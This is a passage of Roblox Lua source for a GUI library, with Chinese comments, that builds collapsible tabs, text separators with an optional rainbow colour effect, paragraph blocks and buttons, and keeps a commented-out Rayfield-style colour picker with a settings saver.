		Description.TextColor3 = Color3.fromRGB(255, 255, 255)
		Description.TextScaled = true
		Description.TextSize = 8.000
		Description.TextWrapped = true
		Description.TextXAlignment = Enum.TextXAlignment.Left

		Arrow.Name = "Arrow"
		Arrow.Parent = TFrame
		Arrow.AnchorPoint = Vector2.new(1, 0.5)
		Arrow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Arrow.BackgroundTransparency = 1.000
		Arrow.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Arrow.BorderSizePixel = 0
		Arrow.Position = UDim2.new(0.980000019, 0, 0.5, 0)
		Arrow.Size = UDim2.new(0.400000006, 0, 0.400000006, 0)
		Arrow.SizeConstraint = Enum.SizeConstraint.RelativeYY
		Arrow.ZIndex = 5
		Arrow.Image = "rbxassetid://10709791437" -->图
		Arrow.ImageTransparency = 1

		Button.Name = "Button"
		Button.Parent = TFrame
		Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Button.BackgroundTransparency = 1.000
		Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Button.BorderSizePixel = 0
		Button.Size = UDim2.new(1, 0, 1, 0)
		Button.ZIndex = 15
		Button.Font = Enum.Font.SourceSans
		Button.TextColor3 = Color3.fromRGB(0, 0, 0)
		Button.TextSize = 14.000
		Button.TextTransparency = 1.000

		local Root = {};
		local TabCenterFrame = Instance.new("Frame")
		local ScrollingFrame = Instance.new("ScrollingFrame")
		local UIListLayout = Instance.new("UIListLayout")

		TabCenterFrame.Name = "TabCenterFrame"
		TabCenterFrame.Parent = TabFrames
		TabCenterFrame.AnchorPoint = Vector2.new(0.5, 0.5)
		TabCenterFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TabCenterFrame.BackgroundTransparency = 1.000
		TabCenterFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
		TabCenterFrame.BorderSizePixel = 0
		TabCenterFrame.Position = UDim2.new(0.5, 0, 0.9, 0)
		TabCenterFrame.Size = UDim2.new(0.99000001, 0, 0.99000001, 0)
		TabCenterFrame.ZIndex = 6

		ScrollingFrame.Parent = TabCenterFrame
		ScrollingFrame.Active = true
		ScrollingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
		ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ScrollingFrame.BackgroundTransparency = 1.000
		ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
		ScrollingFrame.BorderSizePixel = 0
		ScrollingFrame.ClipsDescendants = false
		ScrollingFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
		ScrollingFrame.Size = UDim2.new(0.999000013, 0, 0.99000001, 0)
		ScrollingFrame.ZIndex = 10
		ScrollingFrame.ScrollBarThickness = 0

		UIListLayout.Parent = ScrollingFrame
		UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
		UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		UIListLayout.Padding = UDim.new(0, 1000)

		Library:Tween(UIListLayout , TweenInfo.new(1.5,Enum.EasingStyle.Quint),{
			Padding = UDim.new(0, 7)
		})

		UIListLayout:GetPropertyChangedSignal('AbsoluteContentSize'):Connect(function()
			if WindowLibrary.Toggle then
				ScrollingFrame.CanvasSize = UDim2.fromOffset(0,UIListLayout.AbsoluteContentSize.Y);
			end;
		end);

		Library:MakeDrop(TFrame , UIStroke , Library.Colors.Hightlight)

		local TabToggle = function(Value)
			if Value then
				TabCenterFrame.Visible = true;
				Library:Tween(Arrow , Library.TweenLibrary.SmallEffect,{
					ImageTransparency = 0.150,
					Position = UDim2.new(0.980000019, 0, 0.5, 0)
				})

				Library:Tween(TabCenterFrame,Library.TweenLibrary.SmallEffect,{
					Position = UDim2.new(0.5, 0, 0.500999987, 0),
				})
			else
				TabCenterFrame.Visible = false;
				Library:Tween(Arrow , Library.TweenLibrary.SmallEffect,{
					ImageTransparency = 1,
					Position = UDim2.new(1, 0, 0.5, 0)
				})

				Library:Tween(TabCenterFrame,Library.TweenLibrary.SmallEffect,{
					Position = UDim2.new(0.5, 0, 0.5500999987, 0),
				})
			end;
		end;

		TabToggle(not WindowLibrary.SectionTab[1])

		table.insert(WindowLibrary.SectionTab,{Id = TFrame , TabToggle = TabToggle});

		TFrame:GetPropertyChangedSignal('AbsoluteSize'):Connect(function()
			if not WindowLibrary.Toggle then
				return;
			end

			Title.Position = UDim2.new((30 / TFrame.AbsoluteSize.X), 0, 0.5, 0)
		end)

		Button.MouseButton1Click:Connect(function()
			for i,v in ipairs(WindowLibrary.SectionTab) do
				if v.Id == TFrame then
					v.TabToggle(true);
				else
					v.TabToggle(false);
				end;
			end;
		end)
------ // 分隔符  ----------------------------------------------------------------------------------------
        function Root:Block(Setup, positionUDim, sizeUDim, fontType, textColor, colorEffect)
            local params = {
                Setup = "分隔符",
                positionUDim = 0.02,
                sizeUDim = 0.99000001,
                fontType = Enum.Font.Gotham,
                textColor = Library.Colors.TextColor,
                colorEffect = false
            };
            if Setup ~= nil then params.Setup = Setup end
            if positionUDim ~= nil then params.positionUDim = positionUDim end
            if sizeUDim ~= nil then params.sizeUDim = sizeUDim end
            if fontType ~= nil then params.fontType = fontType end
            if textColor ~= nil then params.textColor = textColor end
            if colorEffect ~= nil then params.colorEffect = colorEffect end

            local BlockLabel = Instance.new("Frame")
            local TextLabel = Instance.new("TextLabel")

            BlockLabel.Name = "BlockLabel"
            BlockLabel.Parent = ScrollingFrame
            BlockLabel.BackgroundColor3 = Library.Colors.Default
            BlockLabel.BackgroundTransparency = 1.000
            BlockLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
            BlockLabel.BorderSizePixel = 0
            BlockLabel.Size = UDim2.new(params.sizeUDim, 0, 0, 25)
            BlockLabel.ZIndex = 10

            TextLabel.Parent = BlockLabel
            TextLabel.AnchorPoint = Vector2.new(0, 0.5)
            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.BackgroundTransparency = 1.000
            TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
            TextLabel.BorderSizePixel = 0
            TextLabel.Position = UDim2.new(params.positionUDim, 0, 0.5, 0)
            TextLabel.Size = UDim2.new(1, 0, 0.649999976, 0)
            TextLabel.ZIndex = 11
            TextLabel.Font = params.fontType
            TextLabel.Text = params.Setup
            TextLabel.TextColor3 = params.textColor
            TextLabel.TextScaled = true
            TextLabel.TextSize = 14.000
            TextLabel.TextStrokeColor3 = params.textColor
            TextLabel.TextStrokeTransparency = 0.950
            TextLabel.TextWrapped = true
            TextLabel.TextXAlignment = Enum.TextXAlignment.Left
            TextLabel.RichText = true

            local RootSkid = {}

            function RootSkid:Set(XGoHubText)
                TextLabel.Text = XGoHubText;
            end;

            function RootSkid:SetVisible(value)
                BlockLabel.Visible = value;
            end;

            function RootSkid:SetTextColor(newTextColor)
                TextLabel.TextColor3 = newTextColor;
                TextLabel.TextStrokeColor3 = newTextColor;
            end;
           
            if colorEffect then
                local function zigzag(X)
                    return math.acos(math.cos(X * math.pi)) / math.pi
                end

                local function colorChange(textLabel)
                    local counter = 0
                    spawn(function()
                        while true do
                            wait(0.03)
                            textLabel.TextColor3 = Color3.fromHSV(zigzag(counter), 1, 1)
                            counter = counter + 0.01
                        end
                    end)
                end

                colorChange(TextLabel)
            end

            return RootSkid;
        end;
------ // 信息标签   ----------------------------------------------------------------------------------------
     	function Root:Paragraph(Setup)
			Setup = Setup or {};
			Setup.Title = Setup.Title
			Setup.Description = Setup.Description or "";

			local ParagraphBlock = Instance.new("Frame")
			local DropShadow = Instance.new("ImageLabel")
			local UIStroke = Instance.new("UIStroke")
			local Title = Instance.new("TextLabel")
			local Description = Instance.new("TextLabel")

			ParagraphBlock.Name = "ParagraphBlock"
			ParagraphBlock.Parent = ScrollingFrame
			ParagraphBlock.BackgroundColor3 = Library.Colors.Default
			ParagraphBlock.BackgroundTransparency = 0.250
			ParagraphBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
			ParagraphBlock.BorderSizePixel = 0
			ParagraphBlock.Size = UDim2.new(0.99000001, 0, 0, 24)
			ParagraphBlock.ZIndex = 10

			DropShadow.Name = "DropShadow"
			DropShadow.Parent = ParagraphBlock
			DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DropShadow.BackgroundTransparency = 1.000
			DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
			DropShadow.Position = UDim2.new(0, -5, 0, -5)
			DropShadow.Size = UDim2.new(1, 10, 1, 10)
			DropShadow.ZIndex = 9
			DropShadow.Image = "rbxassetid://297694300"
			DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
			DropShadow.ImageTransparency = 0.500
			DropShadow.ScaleType = Enum.ScaleType.Slice
			DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
			DropShadow.SliceScale = 0.050

			UIStroke.Transparency = 0.850
			UIStroke.Color = Color3.fromRGB(156, 156, 156)
			UIStroke.Parent = ParagraphBlock

			Title.RichText = true
			Title.Name = "Title"
			Title.Parent = ParagraphBlock
			Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Title.BackgroundTransparency = 1.000
			Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Title.BorderSizePixel = 0
			Title.Position = UDim2.new(0, 5, 0, 5)
			Title.Size = UDim2.new(1, 0, 0, 14)
			Title.ZIndex = 11
			Title.Font = Enum.Font.Gotham
			Title.Text = Setup.Title
			Title.TextColor3 = Library.Colors.TextColor
			Title.TextScaled = true
			Title.TextSize = 14.000
			Title.TextStrokeColor3 = Library.Colors.TextColor
			Title.TextStrokeTransparency = 0.950
			Title.TextWrapped = true
			Title.TextXAlignment = Enum.TextXAlignment.Left
			Title.RichText = true

			Description.Name = "Description"
			Description.Parent = ParagraphBlock
			Description.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Description.BackgroundTransparency = 1.000
			Description.BorderColor3 = Color3.fromRGB(0, 0, 0)
			Description.BorderSizePixel = 0
			Description.Position = UDim2.new(0, 5, 0, 21)
			Description.Size = UDim2.new(1, 0, 0, 45)
			Description.Visible = false
			Description.ZIndex = 11
			Description.Font = Enum.Font.Gotham
			Description.Text = Setup.Description
			Description.TextColor3 = Library.Colors.TextColor
			Description.TextSize = 13.000
			Description.TextStrokeColor3 = Library.Colors.TextColor
			Description.TextStrokeTransparency = 0.950
			Description.TextTransparency = 0.500
			Description.TextWrapped = true
			Description.TextXAlignment = Enum.TextXAlignment.Left
			Description.TextYAlignment = Enum.TextYAlignment.Top
			Description.RichText = true

			local UpdateBlock = function()
				local TitleSize = 14;
				local MainSize = Library:GetTextSize(Description.Text,Description.TextSize,Description.Font);
				local DescriptionSize = MainSize.Y;

				Description.Size = UDim2.new(1, MainSize.X, 0, DescriptionSize + 5)

				if Description.Text:byte() then
					Description.Visible = true;
					Library:Tween(ParagraphBlock,Library.TweenLibrary.SmallEffect,{
						Size = UDim2.new(0.99, 0, 0, TitleSize + ((Description.Visible and Description.AbsoluteSize.Y + 5) or 0));
					});

				else
					Description.Visible = false;

					Library:Tween(ParagraphBlock,Library.TweenLibrary.SmallEffect,{
						Size = UDim2.new(0.99, 0, 0, Title.AbsoluteSize.Y + 10);
					});
				end;
			end;

			UpdateBlock()

			local RootSkid = {};

			function RootSkid:Title(Setup)
				Title.Text = Setup
				UpdateBlock()
			end;

			function RootSkid:Description(Setup)
				Description.Text = Setup
				UpdateBlock()
			end;

			function RootSkid:Visible(value)
				ParagraphBlock.Visible = value;
			end;

			return RootSkid;
		end;
--[[---- // 颜色选择器   ----------------------------------------------------------------------------------------
local function SaveConfiguration()
    if not CEnabled then return end

    local Data = {}
    for i, v in pairs(RayfieldLibrary.Flags) do
        if v.Type == "ColorPicker" then
            Data[i] = PackColor(v.Color)
        else
            if typeof(v.CurrentValue) == 'boolean' then
                Data[i] = v.CurrentValue
            else
                Data[i] = v.CurrentValue or v.CurrentKeybind or v.CurrentOption or v.Color
            end
        end
    end

    -- 将数据转换为 JSON 字符串
    local JsonData = HttpService:JSONEncode(Data)

    if useStudio then
        -- 在 Roblox 编辑器中创建一个 ScreenGui 来显示配置数据
        if script.Parent:FindFirstChild('configuration') then
            script.Parent.configuration:Destroy()
        end
        
        local ScreenGui = Instance.new("ScreenGui")
        ScreenGui.Parent = script.Parent
        ScreenGui.Name = 'configuration'

        local TextBox = Instance.new("TextBox")
        TextBox.Parent = ScreenGui
        TextBox.Size = UDim2.new(0, 800, 0, 50)
        TextBox.AnchorPoint = Vector2.new(0.5, 0)
        TextBox.Position = UDim2.new(0.5, 0, 0, 30)
        TextBox.Text = JsonData
        TextBox.ClearTextOnFocus = false
        TextBox.BackgroundColor3 = Library.Colors.Default
        TextBox.BackgroundTransparency = 0.5
        TextBox.TextColor3 = Library.Colors.TextColor
        TextBox.TextSize = 14
        TextBox.Font = Enum.Font.Gotham
        TextBox.TextXAlignment = Enum.TextXAlignment.Left
        TextBox.TextWrapped = true
    else
        -- 将配置数据写入到文件中
        if writefile then
            writefile(ConfigurationFolder .. "/" .. CFileName .. ConfigurationExtension, tostring(JsonData))
        end
    end
end

function Root:ColorPicker(setup) -- by Throit
    ColorPickerSettings.Type = "ColorPicker"
    local ColorPicker = Elements.Template.ColorPicker:Clone()
    local Background = ColorPicker.CPBackground
    local Display = Background.Display
    local Main = Background.MainCP
    local Slider = ColorPicker.ColorSlider
    ColorPicker.ClipsDescendants = true
    ColorPicker.Name = ColorPickerSettings.Name
    ColorPicker.Title.Text = ColorPickerSettings.Name
    ColorPicker.Visible = true
    ColorPicker.Parent = TabPage
    ColorPicker.Size = UDim2.new(1, -10, 0, 45)
    Background.Size = UDim2.new(0, 39, 0, 22)
    Display.BackgroundTransparency = 0
    Main.MainPoint.ImageTransparency = 1
    ColorPicker.Interact.Size = UDim2.new(1, 0, 1, 0)
    ColorPicker.Interact.Position = UDim2.new(0.5, 0, 0.5, 0)
    ColorPicker.RGB.Position = UDim2.new(0, 17, 0, 70)
    ColorPicker.HexInput.Position = UDim2.new(0, 17, 0, 90)
    Main.ImageTransparency = 1
    Background.BackgroundTransparency = 1

    for _, rgbinput in ipairs(ColorPicker.RGB:GetChildren()) do
        if rgbinput:IsA("Frame") then
            rgbinput.BackgroundColor3 = Library.Colors.Default
            rgbinput.UIStroke.Color = Library.Colors.Hightlight
        end
    end

    ColorPicker.HexInput.BackgroundColor3 = Library.Colors.Default
    ColorPicker.HexInput.UIStroke.Color = Library.Colors.Hightlight

    local opened = false 
    local mouse = game.Players.LocalPlayer:GetMouse()
    Main.Image = "http://www.roblox.com/asset/?id=11415645739"
    local mainDragging = false 
    local sliderDragging = false 
    ColorPicker.Interact.MouseButton1Down:Connect(function()
        task.spawn(function()
            TweenService:Create(ColorPicker, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {BackgroundColor3 = Library.Colors.ElementBackgroundHover}):Play()
            TweenService:Create(ColorPicker.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {Transparency = 1}):Play()
            task.wait(0.2)
            TweenService:Create(ColorPicker, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {BackgroundColor3 = Library.Colors.ElementBackground}):Play()
            TweenService:Create(ColorPicker.UIStroke, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {Transparency = 0}):Play()
        end)

        if not opened then
            opened = true 
            TweenService:Create(Background, TweenInfo.new(0.45, Enum.EasingStyle.Exponential), {Size = UDim2.new(0, 18, 0, 15)}):Play()
            task.wait(0.1)
            TweenService:Create(ColorPicker, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {Size = UDim2.new(1, -10, 0, 120)}):Play()
            TweenService:Create(Background, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {Size = UDim2.new(0, 173, 0, 86)}):Play()
            TweenService:Create(Display, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {BackgroundTransparency = 1}):Play()
            TweenService:Create(ColorPicker.Interact, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {Position = UDim2.new(0.289, 0, 0.5, 0)}):Play()
            TweenService:Create(ColorPicker.RGB, TweenInfo.new(0.8, Enum.EasingStyle.Exponential), {Position = UDim2.new(0, 17, 0, 40)}):Play()
            TweenService:Create(ColorPicker.HexInput, TweenInfo.new(0.5, Enum.EasingStyle.Exponential), {Position = UDim2.new(0, 17, 0, 73)}):Play()
            TweenService:Create(ColorPicker.Interact, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {Size = UDim2.new(0.574, 0, 1, 0)}):Play()
            TweenService:Create(Main.MainPoint, TweenInfo.new(0.2, Enum.EasingStyle.Exponential), {ImageTransparency = 0}):Play()
            TweenService:Create(Main, TweenInfo.new(0.2, Enum.EasingStyle.Exponential), {ImageTransparency = Library.Colors ~= Library.Theme.Default and 0.25 or 0.1}):Play()
            TweenService:Create(Background, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {BackgroundTransparency = 0}):Play()
        else
            opened = false
            TweenService:Create(ColorPicker, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {Size = UDim2.new(1, -10, 0, 45)}):Play()
            TweenService:Create(Background, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {Size = UDim2.new(0, 39, 0, 22)}):Play()
            TweenService:Create(ColorPicker.Interact, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {Size = UDim2.new(1, 0, 1, 0)}):Play()
            TweenService:Create(ColorPicker.Interact, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {Position = UDim2.new(0.5, 0, 0.5, 0)}):Play()
            TweenService:Create(ColorPicker.RGB, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {Position = UDim2.new(0, 17, 0, 70)}):Play()
            TweenService:Create(ColorPicker.HexInput, TweenInfo.new(0.5, Enum.EasingStyle.Exponential), {Position = UDim2.new(0, 17, 0, 90)}):Play()
            TweenService:Create(Display, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {BackgroundTransparency = 0}):Play()
            TweenService:Create(Main.MainPoint, TweenInfo.new(0.2, Enum.EasingStyle.Exponential), {ImageTransparency = 1}):Play()
            TweenService:Create(Main, TweenInfo.new(0.2, Enum.EasingStyle.Exponential), {ImageTransparency = 1}):Play()
            TweenService:Create(Background, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {BackgroundTransparency = 1}):Play()
        end

    end)

    UserInputService.InputEnded:Connect(function(input, gameProcessed) if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then 
        mainDragging = false
        sliderDragging = false
    end end)
    Main.MouseButton1Down:Connect(function()
        if opened then
            mainDragging = true 
        end
    end)
    Main.MainPoint.MouseButton1Down:Connect(function()
        if opened then
            mainDragging = true 
        end
    end)
    Slider.MouseButton1Down:Connect(function()
        sliderDragging = true 
    end)
    Slider.SliderPoint.MouseButton1Down:Connect(function()
        sliderDragging = true 
    end)
    local h,s,v = ColorPickerSettings.Color:ToHSV()
    local color = Color3.fromHSV(h,s,v) 
    local hex = string.format("#%02X%02X%02X",color.R*0xFF,color.G*0xFF,color.B*0xFF)
    ColorPicker.HexInput.InputBox.Text = hex
    local function setDisplay()
        --Main
        Main.MainPoint.Position = UDim2.new(s,-Main.MainPoint.AbsoluteSize.X/2,1-v,-Main.MainPoint.AbsoluteSize.Y/2)
        Main.MainPoint.ImageColor3 = Color3.fromHSV(h,s,v)
        Background.BackgroundColor3 = Color3.fromHSV(h,1,1)
        Display.BackgroundColor3 = Color3.fromHSV(h,s,v)
        --Slider 
        local x = h * Slider.AbsoluteSize.X
        Slider.SliderPoint.Position = UDim2.new(0,x-Slider.SliderPoint.AbsoluteSize.X/2,0.5,0)
        Slider.SliderPoint.ImageColor3 = Color3.fromHSV(h,1,1)
				local color = Color3.fromHSV(h,s,v) 
				local r,g,b = math.floor((color.R*255)+0.5),math.floor((color.G*255)+0.5),math.floor((color.B*255)+0.5)
				ColorPicker.RGB.RInput.InputBox.Text = tostring(r)
				ColorPicker.RGB.GInput.InputBox.Text = tostring(g)
				ColorPicker.RGB.BInput.InputBox.Text = tostring(b)
				hex = string.format("#%02X%02X%02X",color.R*0xFF,color.G*0xFF,color.B*0xFF)
				ColorPicker.HexInput.InputBox.Text = hex
			end
			setDisplay()
			ColorPicker.HexInput.InputBox.FocusLost:Connect(function()
				if not pcall(function()
						local r, g, b = string.match(ColorPicker.HexInput.InputBox.Text, "^#?(%w%w)(%w%w)(%w%w)$")
						local rgbColor = Color3.fromRGB(tonumber(r, 16),tonumber(g, 16), tonumber(b, 16))
						h,s,v = rgbColor:ToHSV()
						hex = ColorPicker.HexInput.InputBox.Text
						setDisplay()
						ColorPickerSettings.Color = rgbColor
					end) 
				then 
					ColorPicker.HexInput.InputBox.Text = hex 
				end
				pcall(function()ColorPickerSettings.Callback(Color3.fromHSV(h,s,v))end)
				local r,g,b = math.floor((h*255)+0.5),math.floor((s*255)+0.5),math.floor((v*255)+0.5)
				ColorPickerSettings.Color = Color3.fromRGB(r,g,b)
				SaveConfiguration()
			end)
			--RGB
			local function rgbBoxes(box,toChange)
				local value = tonumber(box.Text) 
				local color = Color3.fromHSV(h,s,v) 
				local oldR,oldG,oldB = math.floor((color.R*255)+0.5),math.floor((color.G*255)+0.5),math.floor((color.B*255)+0.5)
				local save 
				if toChange == "R" then save = oldR;oldR = value elseif toChange == "G" then save = oldG;oldG = value else save = oldB;oldB = value end
				if value then 
					value = math.clamp(value,0,255)
					h,s,v = Color3.fromRGB(oldR,oldG,oldB):ToHSV()
					setDisplay()
    else 
        box.Text = tostring(save)
    end
    local r,g,b = math.floor((h*255)+0.5),math.floor((s*255)+0.5),math.floor((v*255)+0.5)
    ColorPickerSettings.Color = Color3.fromRGB(r,g,b)
    SaveConfiguration()
end
ColorPicker.RGB.RInput.InputBox.FocusLost:connect(function()
    rgbBoxes(ColorPicker.RGB.RInput.InputBox,"R")
    pcall(function()ColorPickerSettings.Callback(Color3.fromHSV(h,s,v))end)
end)
ColorPicker.RGB.GInput.InputBox.FocusLost:connect(function()
    rgbBoxes(ColorPicker.RGB.GInput.InputBox,"G")
    pcall(function()ColorPickerSettings.Callback(Color3.fromHSV(h,s,v))end)
end)
ColorPicker.RGB.BInput.InputBox.FocusLost:connect(function()
    rgbBoxes(ColorPicker.RGB.BInput.InputBox,"B")
    pcall(function()ColorPickerSettings.Callback(Color3.fromHSV(h,s,v))end)
end)

RunService.RenderStepped:connect(function()
    if mainDragging then 
        local localX = math.clamp(mouse.X-Main.AbsolutePosition.X,0,Main.AbsoluteSize.X)
        local localY = math.clamp(mouse.Y-Main.AbsolutePosition.Y,0,Main.AbsoluteSize.Y)
        Main.MainPoint.Position = UDim2.new(0,localX-Main.MainPoint.AbsoluteSize.X/2,0,localY-Main.MainPoint.AbsoluteSize.Y/2)
        s = localX / Main.AbsoluteSize.X
        v = 1 - (localY / Main.AbsoluteSize.Y)
        Display.BackgroundColor3 = Color3.fromHSV(h,s,v)
        Main.MainPoint.ImageColor3 = Color3.fromHSV(h,s,v)
        Background.BackgroundColor3 = Color3.fromHSV(h,1,1)
        local color = Color3.fromHSV(h,s,v) 
        local r,g,b = math.floor((color.R*255)+0.5),math.floor((color.G*255)+0.5),math.floor((color.B*255)+0.5)
        ColorPicker.RGB.RInput.InputBox.Text = tostring(r)
        ColorPicker.RGB.GInput.InputBox.Text = tostring(g)
        ColorPicker.RGB.BInput.InputBox.Text = tostring(b)
        ColorPicker.HexInput.InputBox.Text = string.format("#%02X%02X%02X",color.R*0xFF,color.G*0xFF,color.B*0xFF)
        pcall(function()ColorPickerSettings.Callback(Color3.fromHSV(h,s,v))end)
        ColorPickerSettings.Color = Color3.fromRGB(r,g,b)
        SaveConfiguration()
    end
    if sliderDragging then 
        local localX = math.clamp(mouse.X-Slider.AbsolutePosition.X,0,Slider.AbsoluteSize.X)
        h = localX / Slider.AbsoluteSize.X
        Display.BackgroundColor3 = Color3.fromHSV(h,s,v)
        Slider.SliderPoint.Position = UDim2.new(0,localX-Slider.SliderPoint.AbsoluteSize.X/2,0.5,0)
        Slider.SliderPoint.ImageColor3 = Color3.fromHSV(h,1,1)
        Background.BackgroundColor3 = Color3.fromHSV(h,1,1)
        Main.MainPoint.ImageColor3 = Color3.fromHSV(h,s,v)
        local color = Color3.fromHSV(h,s,v) 
        local r,g,b = math.floor((color.R*255)+0.5),math.floor((color.G*255)+0.5),math.floor((color.B*255)+0.5)
        ColorPicker.RGB.RInput.InputBox.Text = tostring(r)
        ColorPicker.RGB.GInput.InputBox.Text = tostring(g)
        ColorPicker.RGB.BInput.InputBox.Text = tostring(b)
        ColorPicker.HexInput.InputBox.Text = string.format("#%02X%02X%02X",color.R*0xFF,color.G*0xFF,color.B*0xFF)
        pcall(function()ColorPickerSettings.Callback(Color3.fromHSV(h,s,v))end)
        ColorPickerSettings.Color = Color3.fromRGB(r,g,b)
        SaveConfiguration()
    end
end)

if Settings.ConfigurationSaving then
    if Settings.ConfigurationSaving.Enabled and ColorPickerSettings.Flag then
        RayfieldLibrary.Flags[ColorPickerSettings.Flag] = ColorPickerSettings
    end
end

function ColorPickerSettings:Set(RGBColor)
    ColorPickerSettings.Color = RGBColor
    h,s,v = ColorPickerSettings.Color:ToHSV()
    color = Color3.fromHSV(h,s,v)
    setDisplay()
end

ColorPicker.MouseEnter:Connect(function()
    TweenService:Create(ColorPicker, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {BackgroundColor3 = Library.Colors.ElementBackgroundHover}):Play()
end)

ColorPicker.MouseLeave:Connect(function()
    TweenService:Create(ColorPicker, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {BackgroundColor3 = Library.Colors.ElementBackground}):Play()
end)

Rayfield.Main:GetPropertyChangedSignal('BackgroundColor3'):Connect(function()
    for _, rgbinput in ipairs(ColorPicker.RGB:GetChildren()) do
        if rgbinput:IsA("Frame") then
            rgbinput.BackgroundColor3 = Library.Colors.InputBackground
            rgbinput.UIStroke.Color = Library.Colors.InputStroke
        end
    end

    ColorPicker.HexInput.BackgroundColor3 = Library.Colors.InputBackground
    ColorPicker.HexInput.UIStroke.Color = Library.Colors.InputStroke
end)

return ColorPickerSettings
--]]---- // 按钮组件   ----------------------------------------------------------------------------------------
        function Root:Button(setup)
            setup = setup or {};
            setup.Title = setup.Title or "按钮";
            setup.Content = setup.Content or "";
            setup.Callback = setup.Callback or function() end;
            setup.Tip = setup.Tip or nil;

            local ButtonBlock = Instance.new("Frame")
            local DropShadow = Instance.new("ImageLabel")
            local UIStroke = Instance.new("UIStroke")
            local TextLabel = Instance.new("TextLabel")
            local Content = Instance.new("TextLabel")
            local Arrow = Instance.new("ImageLabel")
            local Button = Instance.new("TextButton")            

            ButtonBlock.Name = "ButtonBlock"
            ButtonBlock.Parent = ScrollingFrame
            ButtonBlock.BackgroundColor3 = Library.Colors.Default
            ButtonBlock.BackgroundTransparency = 0.250
            ButtonBlock.BorderColor3 = Color3.fromRGB(0, 0, 0)
            ButtonBlock.BorderSizePixel = 0
            ButtonBlock.Size = UDim2.new(0.99000001, 0, 0, Library.ItemHeight)
            ButtonBlock.ZIndex = 10

            DropShadow.Name = "DropShadow"
            DropShadow.Parent = ButtonBlock
            DropShadow.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            DropShadow.BackgroundTransparency = 1.000
            DropShadow.BorderColor3 = Color3.fromRGB(27, 42, 53)
            DropShadow.Position = UDim2.new(0, -5, 0, -5)
            DropShadow.Size = UDim2.new(1, 10, 1, 10)
            DropShadow.ZIndex = 9
            DropShadow.Image = "rbxassetid://297694300"
            DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
            DropShadow.ImageTransparency = 0.500
            DropShadow.ScaleType = Enum.ScaleType.Slice
            DropShadow.SliceCenter = Rect.new(95, 103, 894, 902)
            DropShadow.SliceScale = 0.050

            UIStroke.Transparency = 0.850
            UIStroke.Color = Color3.fromRGB(156, 156, 156)
            UIStroke.Parent = ButtonBlock

            TextLabel.Parent = ButtonBlock
            TextLabel.AnchorPoint = Vector2.new(0, 0.5)
            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.BackgroundTransparency = 1.000
            TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
            TextLabel.BorderSizePixel = 0
            TextLabel.Size = UDim2.new(1, 0, 0, 14)
            TextLabel.ZIndex = 11
            TextLabel.Font = Enum.Font.Gotham
            TextLabel.Text = setup.Title
            TextLabel.TextColor3 = Library.Colors.TextColor
            TextLabel.TextScaled = true
            TextLabel.TextSize = 14.000
            TextLabel.TextStrokeColor3 = Library.Colors.TextColor
            TextLabel.TextStrokeTransparency = 0.950
            TextLabel.TextWrapped = true
            TextLabel.TextXAlignment = Enum.TextXAlignment.Left
            TextLabel.RichText = true
    
            Content.Name = "Content"
            Content.Parent = ButtonBlock
            Content.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Content.BackgroundTransparency = 1.000
            Content.BorderColor3 = Color3.fromRGB(0, 0, 0)
            Content.BorderSizePixel = 0
            Content.Position = UDim2.new(0, 5, 0, 18)
            Content.Size = UDim2.new(1, 0, 0, 45)
            Content.Visible = false
            Content.ZIndex = 11
            Content.Font = Enum.Font.Gotham
            Content.Text = setup.Content
            Content.TextColor3 = Library.Colors.TextColor
            Content.TextSize = 13.000
            Content.TextStrokeColor3 = Library.Colors.TextColor
            Content.TextStrokeTransparency = 0.950
            Content.TextTransparency = 0.500
            Content.TextWrapped = true
            Content.TextXAlignment = Enum.TextXAlignment.Left
            Content.TextYAlignment = Enum.TextYAlignment.Top
            Content.RichText = true
    
            Arrow.Name = "Arrow"
            Arrow.Parent = ButtonBlock
            Arrow.AnchorPoint = Vector2.new(1, 0.5)
